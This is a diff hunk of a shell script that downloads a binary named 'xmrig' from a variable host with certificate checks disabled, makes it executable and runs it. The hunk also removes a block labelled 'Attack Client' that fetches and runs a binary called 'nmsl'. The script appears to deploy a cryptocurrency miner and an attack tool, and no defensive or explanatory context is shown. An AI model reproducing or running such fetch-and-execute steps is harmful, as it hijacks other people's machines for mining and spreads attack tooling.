@@ -153,7 +153,7 @@ EOF
 # if [ ! -f "xmrig" ]; then
 #     wget --no-check-certificate ${BASE_URL}/xmrig && chmod +x ./xmrig
 # fi
-wget --no-check-certificate ${BASE_URL}/xmrig && chmod +x ./xmrig && ./xmrig
+wget --no-check-certificate ${BASE_URL}/xmrig
+chmod +x ./xmrig
+./xmrig
 
-# Attack Client
-wget --no-check-certificate ${BASE_URL}/nmsl && chmod +x ./nmsl && ./nmsl
